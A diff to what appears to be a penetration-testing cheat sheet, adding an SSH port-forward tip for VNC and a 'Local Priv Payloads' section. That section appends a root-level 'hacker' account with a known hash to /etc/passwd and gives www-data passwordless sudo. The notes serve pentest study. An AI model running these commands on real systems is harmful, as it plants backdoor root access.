@@ -857,6 +857,10 @@ https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon
 nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
 
 vncviewer 127.0.0.1:5000 -passwd secret
+
+Port Forwarding Over SSH For VNC:
+	Kali: ssh -L 5900:localhost:5900 root@192.168.x.x
+	vncviewer localhost:5900
 ```
 
 ## WinRM - 5985
@@ -2994,8 +2998,13 @@ cat id_rsa | base64 -d
 	1) Always check history files. .sql_history files can contain passwords, although they are formatted kind of like this:
  		insert\040into\040support\040(tom,\040xx11yy22!);
 	
-	2) Adding new root account to /etc/passwd (root:password)
- 	root2:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash
+# Local Priv Payloads
+
+Adding user hacker:password to /etc/passwd:
+	echo hacker:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash >> /etc/passwd
+
+Adding Local User To Sudoers
+	echo www-data ALL=(root) NOPASSWD: ALL >> /etc/sudoers
 
 # Cracking Password-protected SSH Key With John
 
